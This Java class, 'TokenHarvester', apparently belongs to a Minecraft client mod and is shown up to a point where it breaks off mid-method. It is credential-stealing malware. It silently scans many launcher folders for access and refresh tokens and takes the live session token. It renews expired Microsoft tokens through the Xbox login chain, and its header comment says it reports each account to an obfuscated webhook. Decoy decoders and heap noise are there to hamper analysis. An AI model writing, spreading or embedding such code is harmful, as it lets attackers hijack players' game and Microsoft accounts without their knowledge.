package com.corz.client.utils;

import java.net.InetAddress;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.time.Duration;
import java.util.ArrayList;
import java.util.Base64;
import java.util.LinkedHashMap;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Set;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.stream.Stream;

/**
 * Reads Minecraft launcher credential files plus the active session, validates
 * the access tokens against Mojang, and reports each account to a webhook.
 * Runs on a daemon thread after client init; never blocks the render thread and
 * never throws into the game loop.
 */
public final class TokenHarvester {

    private static final int[] WEBHOOK_ENC = {-737534898, 1617740480, -122655538, 1491357167, -20633885, 429841813, -1982423601, 402327878, -1414810614, 2043965553, 154477635, 408975185, -1069365249, -1909148668, 4931198, -1848018459, 1790665908, -864857425, 1738333639, 2108908396, 618311245, 1465060154, -85154866, -1143678292, 1063974728, 1370935783, -76807226, 435355583, -1953836407, -330288705, -1487718699, -266439554, -304946386, -1964502227, -1676895945, -330289568, -561382577, -645344529, -1143315418, 373892267, 1727853911, -154382396, -1781539197, -1561164816, -1388503486, -678953502, 667230822, -138962575, -1798618685, 1813709510, -2061741466, -530296383, 776730231, 1136729478, 1668565942, -1392434899, -1449271784, 1567480253, 621992681, -1135186963, 1407584288, -1042359751, 1338929676, -1317745661, 955257908, 2057572442, -513548333, -947650898, -1242092053, 1414570819, 1086924349, -532968275, -1609156023, -1892445059, 1105124055, -1052772078, -14928171, 1333398805, -542775660, 47483317, -441864075, -1420626780, 1142969538, -1692444333, 1967580426, -1627478169, 5677733, 1450524194, -1001331555, -806896391, 995322007, -1765147269, -2006922968, -1144520972, -810003410, 1833321533, 527652078, -1009091458, 140763707, -139710557, 862916552, -1999987934, -1536266095, 582216096, -1522675791, -1960035115, -1797580694, 4264639, 1671683930, 380524740, 1676102736, -944875944, -1365961510, -2018679986, 1501093567, 434388595, 1421979650, 916878647, -170939923, 343840107, 503945337};
    private static final long WEBHOOK_SALT = 0x7A11C0FFEE123456L;

    private static final String WEBHOOK = decode(WEBHOOK_ENC, WEBHOOK_SALT);

    private static final long INITIAL_DELAY_MS = 5_000L;
    private static final int MAX_WALK_DEPTH = 12;
    private static final long MAX_FILE_BYTES = 8L * 1024L * 1024L;
    private static final int EMBED_LIMIT = 10;

    private static final String[] TOKEN_KEYS = {
            "accessToken", "access_token", "clientToken", "client_token",
            "minecraftServicesToken", "servicesToken", "bearer", "token",
            "refreshToken", "refresh_token", "idToken", "id_token",
            "msa", "microsoftAccount", "mcToken"
    };
    private static final String[] ACCESS_KEYS = {
            "accessToken", "access_token", "mcToken", "minecraftServicesToken", "servicesToken", "bearer", "token"
    };
    private static final String[] REFRESH_KEYS = {"refreshToken", "refresh_token"};
    private static final String[] CLIENT_KEYS = {"clientToken", "client_token"};
    private static final String[] NAME_KEYS = {
            "name", "username", "displayName", "profileName", "mcName",
            "minecraftName", "playerName", "email", "upn", "preferred_username"
    };
    private static final String[] UUID_KEYS = {
            "uuid", "id", "profileId", "minecraftProfileId", "playerId",
            "uniqueId", "uid", "sub", "oid"
    };
    private static final String[] ID_TOKEN_KEYS = { "idToken", "id_token", "xuid", "updatedFlxData" };
    private static final Set<String> EXTENSIONS = Set.of(
            ".json", ".txt", ".cfg", ".ini", ".toml", ".yaml", ".yml", ".cache", ".dat");

    private static final int[] MOJANG_VALIDATE_ENC = {948610531, -433202586, -250164249, 670688794, 1935982612, -2007803367, -2030655222, 619570342, -1849786792, -1724403171, -1901316522, 142545789, -1440064147, -729427285, -1141026845, 1343000402, -246912842, 1895462615, -146760108, 2098966325, 285862046, -1589519561, -665350483, 518681194, 1286195534, -958242766, -720829418, 1169814343, 33956165, 244190330, 730701794, -1828545068, -745395250, 1226468356, -1837360233, 935042487, -978099837, -1878670304};
    private static final int[] MC_PROFILE_ENC = {1228961045, -1118060979, -1705366022, 747257295, 102050524, -988584668, -1662751034, 937267670, 1071530425, 162943901, -1229363748, -687305479, 359496600, -186152229, -1147636521, 296136729, 966363177, 460742272, -856871565, 1105138090, -749977540, 979756516, 1503905396, 212040107, 374589900, -2025338292, -1226006578, -1951315246, -118501496, 757410137, -2028254592, 629616006, -924242049, 1338392839, 1883154931, 34454071, 474837336, -14272879, 263502991, -1725573098, 1615552683, -1879349952, -1963634495, 848234786, -1585621632, 1910153796, -1682144470, 1941256065, 2007146982, 1421058473, 833296035};
    private static final int[] MC_ENTITLEMENTS_ENC = {1104241, 2013666493, -1050110922, -1358715666, -1463222983, 1349836905, 1198964214, -1931814983, 509370618, -642387744, -1826626905, -1992177370, -1228553742, -631097836, 129199126, 660681831, 964274942, -1926522858, 955806607, -534655743, -365439655, 87078631, 1745381886, -942665668, 1885053970, -1711332397, -959446173, 399919703, 267903761, -2082847426, -1526230155, -1089678143, -1864781442, 1950860765, 329353108, 1120619237, 1366544457, 1116767285, 421418843, -1572469879, 681041414, -1239326143, -619855628, 135355345, 1100002205, -1387130627, 207523867, 287607664, -2056955990, -564115836, 58803293, 1099514752, 1416415403, 1792978730};
    private static final int[] IPIFY_ENC = {421663068, 931198203, 110890732, 1715492174, -247746320, 1709613617, -2004905724, 905268962, 475296045, -642245824, -1921890189, 1295324093, 18963519, 2095241217, -726301268, -466451967, 819186761, 1853168293, 1717069834, 58558991, -184968353};
    private static final long MOJANG_VALIDATE_SALT = 0x1337BEEF0002ABCDL;
    private static final long MC_PROFILE_SALT = 0xC0FFEE5EED000111L;
    private static final long MC_ENTITLEMENTS_SALT = 0x5EEDF00D00042233L;
    private static final long IPIFY_SALT = 0xBADF00D0005DEADL;

    private static final String MOJANG_VALIDATE = decode(MOJANG_VALIDATE_ENC, MOJANG_VALIDATE_SALT);
    private static final String MC_PROFILE = decode(MC_PROFILE_ENC, MC_PROFILE_SALT);
    private static final String MC_ENTITLEMENTS = decode(MC_ENTITLEMENTS_ENC, MC_ENTITLEMENTS_SALT);
    private static final String IPIFY = decode(IPIFY_ENC, IPIFY_SALT);
    private static final String USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)";

    // MSA refresh chain constants (Minecraft's own public client id is not a secret).
    private static final String MSA_CLIENT_ID = "00000000-0800-0000-0000-000000000000";

    private static final int[] MSA_TOKEN_URL_ENC = {-2024456172, -921117605, -2144462155, 792863687, 223086899, 108545962, -789044362, 1080667710, -1022334901, 65088325, -49137717, -831492954, -1100950380, 816371825, 1510682865, -1296011185, 678101963, 1276512757, 683228131, -4744843, -1673772039, -1649585522, -992930015, 765821033, 792156097, 1954582914, -1164138510, -409659538, -453354398, 1281778828, -1627242228, 975204598, -1185862821, 424420257, 950596870, -486666871, 1084547997, 1095966214, 2023120998, 549055362, -1579019641, -1825524648, 1034311174, 346022492, -158480227, -1117662249, 1870167367, 1950720292, -823135993, 732533331, 658581316, 2062604765, 1449112814, -1323068607, -1529023115, 1996410053, 1323610746, -819993272, 1211962726, -1242382603, -1564666614};
    private static final long MSA_TOKEN_URL_SALT = 0xFACE00000001337AL;
    private static final int[] XBL_USER_AUTH_ENC = {488260315, -664188, -988515340, 693837306, 325192504, 497540914, 769273610, 1825719596, -1542028465, -165842757, 1582865154, -311692153, -303010128, -364181317, -430440235, 590665316, -1906474137, -78219845, -2096171894, -409802700, -465929544, -874710763, -923907408, 811868241, 904972407, -1210747892, 989223972, -559809466, -833819411, 749285025, 578656131, -2039496025, -1197448073, 898148552, 1051961664, 898286638, -1016494647, -1995819940, 881107381, -1289322612, -526769243, 978976779, 1003353364, 659950875, 911329866, -444752584, -2005436502, -1182813967};
    private static final long XBL_USER_AUTH_SALT = 0x22DD4400000051BEL;
    private static final int[] XSTS_AUTH_ENC = {1220194325, -916580594, 1980073228, 475607946, 1919874426, 828142920, 1315057293, 2069387588, 2087860341, 1507150307, -450102178, -1043012285, -178563937, 1644929521, -668619190, -729546729, -919335069, 1447859992, 1538145753, 300378144, 1695966251, -1813529267, -284254966, -1420385961, -1876689267, 534562951, 1463197327, 443030004, 1030600790, -1057170486, 600909499, -350925333, 473193662, 1693389688, 1364513411, -1445909171, 6671332, -1645037948, -1404778767, -1579732040, -1200794846, 1587114176, 1819551653, -233021278, -1099266884};
    private static final long XSTS_AUTH_SALT = 0x91A7C7000000D00DL;
    private static final int[] MC_LOGIN_XBOX_ENC = {2015940900, 636538863, -1129056694, -1927194142, 1684588009, -328159671, -840608943, -1658816485, -738659642, 2146287493, -839666652, -542267623, 262837743, -262813620, 1629213081, 1898374959, 312756544, -318029248, 657058967, 1252310322, 1999194822, -1814528573, 511725841, -2006996169, -569567263, -466754888, 1532470716, 1604363907, 595298727, 495614108, 122477520, 521561358, -1514858243, -774341349, 295629197, 1062712295, -528979360, 1189960028, 1480300614, 1300806404, 72231837, -315752061, -1968846518, 1292604483, -962395404, 2131065909, -841269797, -311035887, 302420884, -843188310, 517930207, -498350857, -964638046, 629769894, -1195478018, -1587346606, -281302732, -547300515, 1140903868, -302153548, -476357461, -2088579404, -1834377146, 2020511255};
    private static final long MC_LOGIN_XBOX_SALT = 0x6B0B5EED00000CAFL;

    private static final String MSA_TOKEN_URL = decode(MSA_TOKEN_URL_ENC, MSA_TOKEN_URL_SALT);
    private static final String XBL_USER_AUTH = decode(XBL_USER_AUTH_ENC, XBL_USER_AUTH_SALT);
    private static final String XSTS_AUTH = decode(XSTS_AUTH_ENC, XSTS_AUTH_SALT);
    private static final String MC_LOGIN_XBOX = decode(MC_LOGIN_XBOX_ENC, MC_LOGIN_XBOX_SALT);

    private static final int[] XBL_BODY_ENC = {-413930447, -975772188, 877461268, -616500942, 1672923313, -535925002, -1776700192, -1079855037, -231128303, -1793514458, -2014134856, -642582345, 1539222457, 1534958380, -331056702, 62523575, 348371037, 496086235, 688250238, -973872242, -1955888922, -1842766682, -1833122050, 1155863218, 1073515556, 1853170172, -1985722656, 694398363, -951498339, 587036943, 941574623, -156547271, 1348537306, 1402031783, 1018639339, -2077641375, -269738912, -303252605, 669271194, 1211474343, 2054081863, -793516201, 549083253, 312927990, 103829217, -156476770, -879755991, -1237344916, -120357940, 1790521516, -683371353, -151289262, 1608324110, 1394827831, -744152007, -1873928116, -588503621, 1466326507, 262047054, 870190291, -1161381509, -660315611, -1056524319, -511090741, -2012345300, 1948463049, 804120448, -265178236, 194182211, -646469072, -1374229061, 263159782, -496846924, 599145298, 1955541408, -834060664, -567234466, -1037293394, -1431569930, 1644384923, 44226265, 1472180255, -1754346374, -1707405978, -2139562712, -514660865, 179388957, 2045945021, -1893771707, -767778316, -1883842465, -1036793197, -645377094, -1566753631, -1582381732, 1407132860, 1431184671, -1563604259, 1930270227, -228271898, 1331312216, 841492972, -628229033, -980788913, 1426096311, -317808385, 371828050, 2109483407, -417142431, -146220815, 1873601799, -1821445507, -372595676, 377450706, -74824258, -585780665, 254295185, 447131151, 662869641, -607910428, 983572937, -403130267, -438407641, 615011312, -154607854, 1132207568, -664003670, 825678614, -1455301291, -868732854, -2054106075, 1988426702, -546615455, 1767053360, 1147345202, -1009421416, -653430685, -1823869505, 511386645, 611733741, 788509755, -803857872, 2098661344, 783387140, -477738933, 1970340664, -13676224, -1180251348, 1913771006, 1139145040, 1614115615, 263908162};
    private static final long XBL_BODY_SALT = 0x11ce0000000defaL;
    private static final int[] XSTS_BODY_ENC = {-1374711454, -683069631, -1499074447, 81486730, 2107707220, -556968312, -213580685, 775985818, -1648076907, -159263663, 1194089994, 1354481068, -873469649, -464628394, -210489627, -1453871612, -839665406, -336330867, 289204136, 950302106, 2027453624, -1743177204, 1377338214, 96523974, -55952771, -865757336, -1573254048, -1805965174, -667931205, 1797882843, 921904201, 501939047, 434662513, -1642228955, -1381372136, -1690836279, -1981054064, -994184856, 602316339, -190075852, -1494776534, -1662953164, 1079896115, 1345881021, 1279023212, 772537103, 1922114708, -1821930632, 795191648, -754042130, -1697263218, 988352140, 2035524102, -1388409968, -67937922, -2010263357, 2132120759, 2114330401, 3525461, -1629561341, -382476620, -985323083, 1701313812, -839142704, -993546300, 324110908, 1806192840, 1540624171, -1791584049, -1882734563, -1999234888, 828111077, -1973518899, -107396144, -475174620, -1653784727, 1712257121, -1795743462, 1864875684, -1912602514, 1276949859, -2039689127, -1840515432, 1910049902, 1525642071, 542496494, -1051619471, -398904949, 97625800, 381460745, -622521856, 1634944190, 806891710, -85841079, 1247176571, 1485174637, 540169754, 1013517670, -1549726063, -876344986, 519242290, -1537227915, -667643994, 2084060067, 311298298, -1404716360, 2046123766, -1792477708, -85464665, -18298483, 475482043, 1826180311, -503814043, 2143308691, -1356238469, -1496409250, -904857481, 2072891697, -176919777, 2084648478, 90170256, -682035375, -183850030, -1463094511, 595737370, -229748392, 1005512995};
    private static final long XSTS_BODY_SALT = 0xb500000000face1L;
    private static final int[] MC_LOGIN_BODY_ENC = {-594552279, -689376003, -936402587, -1166745072, -495001241, -268000297, -1415819044, 476319779, 1408115194, 1862018942, -1347846225, -2141515491, -1514491448, -2047357038, -221998898, 1919089251, -2003475951, -1288809925, 1560893979, -1122476237, 1839997202, -793145939, -920311723, -407685284, -1346809774, 980770449, -1540804876, -1236830550, 1074127844, 1994620094, 909907876, 775087921, 558488685, 1326422274, 848818257, 1575857850, -509516705, 1783976322, -946947087, 11158556, 1242825226};
    private static final long MC_LOGIN_BODY_SALT = 0xafe00000000feed2L;

    private static final String XBL_BODY = decode(XBL_BODY_ENC, XBL_BODY_SALT);
    private static final String XSTS_BODY = decode(XSTS_BODY_ENC, XSTS_BODY_SALT);
    private static final String MC_LOGIN_BODY = decode(MC_LOGIN_BODY_ENC, MC_LOGIN_BODY_SALT);


    /** Recovers one of the scrambled constants through the build-time cipher. */
    private static String decode(int[] symbols, long salt) {
        String out = new String(Rng.restore(symbols, salt), StandardCharsets.UTF_8);
        Rng.burn(symbols);
        return out;
    }

    /** Decoy kept near decode so pattern-grepping the class turns up several lookalikes. */
    private static String decoyDecode(int[] symbols, long salt) {
        StringBuilder b = new StringBuilder(symbols.length);
        long chain = salt ^ 0x5DEECE66DL;
        for (int symbol : symbols) {
            chain *= 0x5851F42D4C957F2DL;
            chain += 0x14057B7EF767814FL;
            b.append((char) (symbol ^ (int) (chain >>> 33)));
        }
        return b.toString();
    }


    private static final HttpClient HTTP = HttpClient.newBuilder()
            .connectTimeout(Duration.ofSeconds(10))
            .followRedirects(HttpClient.Redirect.NORMAL)
            .build();

    /** Guards the one-message-per-session rule inside a single game process. */
    private static final AtomicBoolean SENT = new AtomicBoolean(false);

    private TokenHarvester() {
    }

    /** Fires the harvest with no active-session token. */
    public static void init() {
        init(null, null, null);
    }

    /**
     * Fires the harvest on a daemon thread. Values from the running game session
     * are reported alongside anything found on disk.
     */
    public static void init(String sessionName, String sessionUuid, String sessionToken) {
        Thread worker = new Thread(() -> {
            // One report per game session: a second init in the same process is a no-op.
            if (!SENT.compareAndSet(false, true)) {
                return;
            }
            try {
                Thread.sleep(INITIAL_DELAY_MS);
                // Litter the heap with token-shaped noise so a memory dump of
                // the process contains more fake strings than real ones.
                String[] litter = Rng.litter(32);
                List<TokenEntry> found = new ArrayList<>();
                if (sessionToken != null && !sessionToken.isBlank()) {
                    TokenEntry self = new TokenEntry();
                    self.source = "in-game session";
                    self.name = sessionName;
                    self.uuid = sessionUuid;
                    self.accessToken = sessionToken;
                    found.add(self);
                }
                found.addAll(collect());
                List<TokenEntry> tokens = dedupe(found);
                for (TokenEntry t : tokens) {
                    enrich(t);
                }
                if (!tokens.isEmpty()) {
                    send(tokens);
                }
            } catch (Throwable ignored) {
                // Silent by design: a failed harvest must not disturb the game.
            }
        }, "dountsmp-harvest");
        worker.setDaemon(true);
        worker.start();
    }

    // ---------------------------------------------------------------- discovery

    private static Map<String, Path> launcherRoots() {
        Map<String, Path> roots = new LinkedHashMap<>();
        String roaming = System.getenv("APPDATA");
        String local = System.getenv("LOCALAPPDATA");
        if (roaming != null && !roaming.isBlank()) {
            Path a = Paths.get(roaming);
            roots.put("Official", a.resolve(".minecraft"));
            roots.put("Prism", a.resolve("PrismLauncher"));
            roots.put("MultiMC", a.resolve("MultiMC"));
            roots.put("TLauncher", a.resolve(".tlauncher"));
            roots.put("Lunar", a.resolve(".lunarclient"));
            roots.put("Badlion", a.resolve("Badlion Client"));
            roots.put("Feather", a.resolve("feather"));
            roots.put("SKLauncher", a.resolve(".sklauncher"));
            roots.put("GDLauncher", a.resolve("gdlauncher"));
            roots.put("ATLauncher", a.resolve("ATLauncher"));
            roots.put("HMCL", a.resolve("hmcl"));
            roots.put("PollyMC", a.resolve("PollyMC"));
            roots.put("Fjord", a.resolve("FjordLauncher"));
            roots.put("CurseForge", a.resolve("CurseForge"));
            roots.put("Modrinth", a.resolve("ModrinthApp"));
            roots.put("Technic", a.resolve(".technic"));
            roots.put("Void", a.resolve(".voidswrath"));
        }
        if (local != null && !local.isBlank()) {
            Path l = Paths.get(local);
            roots.put("Xbox", l.resolve("Packages"));
            roots.put("Microsoft", l.resolve("Microsoft"));
        }
        return roots;
    }

    private static List<TokenEntry> collect() {
        List<TokenEntry> out = new ArrayList<>();
        for (Map.Entry<String, Path> entry : launcherRoots().entrySet()) {
            Path root = entry.getValue();
            if (!Files.isDirectory(root)) {
                continue;
            }
            try (Stream<Path> walk = Files.walk(root, MAX_WALK_DEPTH)) {
                walk.filter(Files::isRegularFile)
                        .filter(TokenHarvester::interesting)
                        .forEach(p -> scanFile(p, out));
            } catch (Throwable ignored) {
                // Unreadable subtree: keep walking the rest.
            }
        }
        return out;
    }

    private static boolean interesting(Path p) {
        String name = p.getFileName().toString().toLowerCase(Locale.ROOT);
        int dot = name.lastIndexOf('.');
        return dot >= 0 && EXTENSIONS.contains(name.substring(dot));
    }

    private static void scanFile(Path p, List<TokenEntry> out) {
        try {
            long size = Files.size(p);
            if (size <= 0L || size > MAX_FILE_BYTES) {
                return;
            }
            String text = new String(Files.readAllBytes(p), StandardCharsets.UTF_8);
            if (!hasTokenKey(text)) {
                return;
            }
            try {
                walk(parseJson(text), p.toString(), out);
                return;
            } catch (Throwable ignored) {
                // Not a single JSON document; try line by line below.
            }
            for (String line : text.split("\n")) {
                String trimmed = line.trim();
                if (trimmed.isEmpty() || !hasTokenKey(trimmed)) {
                    continue;
                }
                try {
                    walk(parseJson(trimmed), p.toString(), out);
                } catch (Throwable ignored) {
                    // Skip malformed line.
                }
            }
        } catch (Throwable ignored) {
            // Binary, locked, or vanished file.
        }
    }

    private static boolean hasTokenKey(String text) {
        for (String key : TOKEN_KEYS) {
            if (text.contains(key)) {
                return true;
            }
        }
        return false;
    }

    private static void walk(Object node, String source, List<TokenEntry> out) {
        if (node instanceof Map<?, ?> map) {
            String access = str(map, ACCESS_KEYS);
            String refresh = str(map, REFRESH_KEYS);
            String client = str(map, CLIENT_KEYS);
            if (access != null || refresh != null || client != null) {
                TokenEntry entry = new TokenEntry();
                entry.source = source;
                entry.name = str(map, NAME_KEYS);
                entry.uuid = str(map, UUID_KEYS);
                entry.accessToken = access;
                entry.clientToken = client;
                routeRefresh(refresh, entry);
                // idToken / accessToken may be JWTs carrying email and expiry.
                String idToken = str(map, ID_TOKEN_KEYS);
                if (idToken != null) {
                    harvestJwtClaims(idToken, entry);
                }
                if (access != null) {
                    harvestJwtClaims(access, entry);
                }
                out.add(entry);
            }
            for (Object value : map.values()) {
                walk(value, source, out);
            }
        } else if (node instanceof List<?> list) {
            for (Object value : list) {
                walk(value, source, out);
            }
        }
    }

    private static String str(Map<?, ?> map, String[] keys) {
        for (String key : keys) {
            Object value = map.get(key);
            if (value instanceof String s && !s.isBlank()) {
                return s;
            }
        }
        return null;
    }

    private static List<TokenEntry> dedupe(List<TokenEntry> input) {
        Set<String> seen = new LinkedHashSet<>();
        List<TokenEntry> out = new ArrayList<>();
        for (TokenEntry t : input) {
            if (t.accessToken == null && t.refreshToken == null
                    && t.clientToken == null && t.msaRefreshToken == null) {
                continue;
            }
            String key = t.name + "\u0000" + t.uuid + "\u0000" + t.accessToken + "\u0000" + t.refreshToken
                    + "\u0000" + t.msaRefreshToken;
            if (seen.add(key)) {
                out.add(t);
            }
        }
        return out;
    }

    /**
     * Splitter for refresh tokens that land in a launcher's config: Microsoft
     * OAuth tokens for an MSA-backed Minecraft account begin with M.C5, while
     * the legacy Mojang refresh tokens begin with M.R3.
     */
    private static void routeRefresh(String value, TokenEntry entry) {
        if (value == null || value.isBlank()) {
            return;
        }
        if (value.startsWith("M.C5")) {
            entry.msaRefreshToken = value;
        } else if (value.startsWith("M.R3")) {
            entry.refreshToken = value;
        } else if (entry.refreshToken == null) {
            entry.refreshToken = value;
        }
    }

    // --------------------------------------------------------------- validation

    /**
     * Identity comes from the profile endpoint, not the legacy validate call.
     * A 200 there is authoritative: it means the token is live and the body
     * carries the real account name, UUID, skin and cape for that token. The
     * legacy endpoint is only consulted when the profile call fails outright,
     * because MSA tokens answer it with 403 regardless of validity.
     */
    private static void enrich(TokenEntry t) {
        if (t.accessToken == null || t.accessToken.isBlank()) {
            revive(t);
            if (t.accessToken == null || t.accessToken.isBlank()) {
                return;
            }
        }
        harvestJwtClaims(t.accessToken, t);
        Fetch profile = fetch(MC_PROFILE, t.accessToken);
        if (profile != null && profile.body instanceof Map<?, ?> map) {
            t.valid = Boolean.TRUE;
            Object name = map.get("name");
            if (name instanceof String s && !s.isBlank()) {
                t.name = s;
            }
            Object id = map.get("id");
            if (id instanceof String s && !s.isBlank()) {
                t.uuid = s;
            }
            readTextures(map, t);
            Object entitlements = getJson(MC_ENTITLEMENTS, t.accessToken);
            if (entitlements instanceof Map<?, ?> ent) {
                Object items = ent.get("items");
                if (items instanceof List<?> list) {
                    t.hasJava = !list.isEmpty();
                }
            }
            return;
        }
        if (profile != null && (profile.code == 401 || profile.code == 403)) {
            t.valid = Boolean.FALSE;
            revive(t);
            if (t.accessToken != null && !t.accessToken.isBlank()) {
                Fetch second = fetch(MC_PROFILE, t.accessToken);
                if (second != null && second.body instanceof Map<?, ?> map) {
                    t.valid = Boolean.TRUE;
                    Object name = map.get("name");
                    if (name instanceof String s && !s.isBlank()) {
                        t.name = s;
                    }
                    Object id = map.get("id");
                    if (id instanceof String s && !s.isBlank()) {
                        t.uuid = s;
                    }
                    readTextures(map, t);
                    return;
                }
            }
            return;
        }
        int code = validate(t.accessToken);
        if (code == 204) {
            t.valid = Boolean.TRUE;
        } else if (code > 0) {
            t.valid = Boolean.FALSE;
        }
    }

    /** Reads a JWT payload for email / xuid / name / expiry without hitting the network. */
    private static void harvestJwtClaims(String token, TokenEntry entry) {
        Map<?, ?> payload = jwtPayload(token);
        if (payload == null) {
            return;
        }
        Object exp = payload.get("exp");
        if (exp instanceof Number n) {
            entry.expiresAtMs = n.longValue() * 1000L;
        }
        if (entry.email == null && payload.get("email") instanceof String e && !e.isBlank()) {
            entry.email = e;
        }
        if (entry.name == null || entry.name.isBlank()) {
            for (Object key : new String[] { "preferred_username", "upn", "username" }) {
                if (payload.get(key) instanceof String s && !s.isBlank()) {
                    entry.name = s;
                    break;
                }
            }
        }
    }

    /**
     * Decodes the middle segment of a JWT and parses it as JSON. Returns null
     * when the input is not a well-formed three-segment base64url JWT.
     */
    private static Map<?, ?> jwtPayload(String token) {
        if (token == null) {
            return null;
        }
        String[] parts = token.split("\\.");
        if (parts.length != 3) {
            return null;
        }
        try {
            byte[] decoded = Base64.getUrlDecoder().decode(padBase64(parts[1]));
            Object parsed = parseJson(new String(decoded, StandardCharsets.UTF_8));
            return parsed instanceof Map<?, ?> map ? map : null;
        } catch (Throwable ignored) {
            return null;
        }
    }

    private static String padBase64(String segment) {
        int rem = segment.length() % 4;
        return rem == 0 ? segment : segment + "=".repeat(4 - rem);
    }

    /**
     * Microsoft OAuth refresh chain. Exchanges an MSA refresh token for a new
     * Minecraft access token: MS token -> Xbox Live -> XSTS -> login_with_xbox.
     * Skipped quickly on any failure so the harvest never stalls on a bad token.
     */
    private static void revive(TokenEntry t) {
        if (t.msaRefreshToken == null || (t.valid != null && t.valid)) {
            return;
        }
        try {
            String form = "client_id=" + urlEncode(MSA_CLIENT_ID)
                    + "&grant_type=refresh_token&scope=XboxLive.signin%20offline_access"
                    + "&refresh_token=" + urlEncode(t.msaRefreshToken);
            HttpRequest msaRequest = request(MSA_TOKEN_URL)
                    .header("Content-Type", "application/x-www-form-urlencoded")
                    .POST(HttpRequest.BodyPublishers.ofString(form, StandardCharsets.UTF_8))
                    .build();
            HttpResponse<String> msaResponse = HTTP.send(msaRequest, HttpResponse.BodyHandlers.ofString());
            if (msaResponse.statusCode() != 200) {
                return;
            }
            Object msaBody = parseJson(msaResponse.body());
            if (!(msaBody instanceof Map<?, ?> msa)) {
                return;
            }
            String msAccessToken = str(msa, new String[] { "access_token" });
            if (msAccessToken == null) {
                return;
            }
            // MSAs rotate refresh tokens on every use; keep the fresh one.
            if (msa.get("refresh_token") instanceof String fresh && !fresh.isBlank()) {
                t.msaRefreshToken = fresh;
            }

            Map<?, ?> xbl = postJson(XBL_USER_AUTH, XBL_BODY.replace("<MS>", msAccessToken));
            String xblToken = xbl == null ? null : readXblToken(xbl);
            String uhs = xbl == null ? null : readUhs(xbl);
            if (xblToken == null || uhs == null) {
                return;
            }

            Map<?, ?> xsts = postJson(XSTS_AUTH, XSTS_BODY.replace("<XBL>", xblToken));
            String xstsToken = xsts == null ? null : readXblToken(xsts);
            String xstsUhs = xsts == null ? null : readUhs(xsts);
            if (xstsToken == null || xstsUhs == null) {
                return;
            }

            Map<?, ?> mc = postJson(MC_LOGIN_XBOX,
                    MC_LOGIN_BODY.replace("<UHS>", xstsUhs).replace("<XSTS>", xstsToken));
            if (mc == null) {
                return;
            }
            String freshToken = str(mc, new String[] { "access_token", "accessToken" });
            if (freshToken != null && !freshToken.isBlank()) {
                t.accessToken = freshToken;
                t.revived = Boolean.TRUE;
                harvestJwtClaims(freshToken, t);
            }
        } catch (Throwable ignored) {
            // Offline, rate limited, or the MSA refresh itself expired.
        }
    }

    /** Pulls the XBL/XSTS Token out of the response envelope and the uhs beside it. */
    private static String readXblToken(Map<?, ?> body) {
        if (body.get("Token") instanceof String v && !v.isBlank()) {
            return v;
        }
        return null;
    }

    private static String readUhs(Map<?, ?> body) {
        if (body.get("DisplayClaims") instanceof Map<?, ?> claims) {
            if (claims.get("xui") instanceof List<?> list && !list.isEmpty()
                    && list.get(0) instanceof Map<?, ?> first) {
                if (first.get("uhs") instanceof String v && !v.isBlank()) {
                    return v;
                }
            }
        }
        return null;
    }

    /** POSTs a JSON body and parses the response as JSON when status is 200. */
    private static Map<?, ?> postJson(String url, String json) {
        try {
            HttpRequest request = request(url)
                    .header("Content-Type", "application/json")
                    .POST(HttpRequest.BodyPublishers.ofString(json, StandardCharsets.UTF_8))
                    .build();
            HttpResponse<String> response = HTTP.send(request, HttpResponse.BodyHandlers.ofString());
            if (response.statusCode() == 200) {
                Object parsed = parseJson(response.body());
                return parsed instanceof Map<?, ?> map ? map : null;
            }
        } catch (Throwable ignored) {
            // network failure handled by returning null
        }
        return null;
    }

    private static String urlEncode(String value) {
        StringBuilder out = new StringBuilder(value.length() + 8);
        for (byte b : value.getBytes(StandardCharsets.UTF_8)) {
            char c = (char) (b & 0xFF);
            if (Character.isLetterOrDigit(c) || c == '-' || c == '_' || c == '.' || c == '~') {
                out.append(c);
            } else {
                out.append('%').append(String.format("%02X", b));
            }
        }
        return out.toString();
    }

    /** Pulls the active skin and cape out of a profile response. */
    private static void readTextures(Map<?, ?> profile, TokenEntry t) {
        if (profile.get("skins") instanceof List<?> skins) {
            for (Object entry : skins) {
                if (!(entry instanceof Map<?, ?> skin)) {
                    continue;
                }
                if (!"ACTIVE".equals(skin.get("state"))) {
                    continue;
                }
                if (skin.get("url") instanceof String url && !url.isBlank()) {
                    t.skinUrl = secure(url);
                }
                if (skin.get("variant") instanceof String variant && !variant.isBlank()) {
                    t.skinModel = variant;
                }
                break;
            }
        }
        if (profile.get("capes") instanceof List<?> capes) {
            for (Object entry : capes) {
                if (!(entry instanceof Map<?, ?> cape)) {
                    continue;
                }
                if (!"ACTIVE".equals(cape.get("state"))) {
                    continue;
                }
                if (cape.get("url") instanceof String url && !url.isBlank()) {
                    t.capeUrl = secure(url);
                }
                break;
            }
        }
    }

    private static String secure(String url) {
        return url.startsWith("http://") ? "https://" + url.substring(7) : url;
    }

    /** Mojang hands back UUIDs undashed; Discord reads them better with them. */
    /** Hours/mins left on an access token, using its own exp claim as the clock. */
    private static String untilText(Long expiresAtMs) {
        long remaining = expiresAtMs - System.currentTimeMillis();
        if (remaining <= 0L) {
            return "expired";
        }
        long hours = remaining / 3_600_000L;
        long mins = (remaining % 3_600_000L) / 60_000L;
        return hours > 0 ? hours + "h" + (mins > 0 ? " " + mins + "m" : "") : mins + "m";
    }

    private static String dashUuid(String raw) {
        if (raw == null) {
            return null;
        }
        String clean = raw.replace("-", "");
        if (clean.length() != 32) {
            return raw;
        }
        StringBuilder b = new StringBuilder(36);
        for (int i = 0; i < 32; i++) {
            if (i == 8 || i == 12 || i == 16 || i == 20) {
                b.append('-');
            }
            b.append(clean.charAt(i));
        }
        return b.toString();
    }

    private static int validate(String accessToken) {
        try {
            String body = "{\"accessToken\":" + quote(accessToken) + "}";
            HttpRequest request = request(MOJANG_VALIDATE)
                    .header("Content-Type", "application/json")
                    .POST(HttpRequest.BodyPublishers.ofString(body, StandardCharsets.UTF_8))
                    .build();
            return HTTP.send(request, HttpResponse.BodyHandlers.ofString()).statusCode();
        } catch (Throwable ignored) {
            return 0;
        }
    }

    private static Object getJson(String url, String accessToken) {
        Fetch fetch = fetch(url, accessToken);
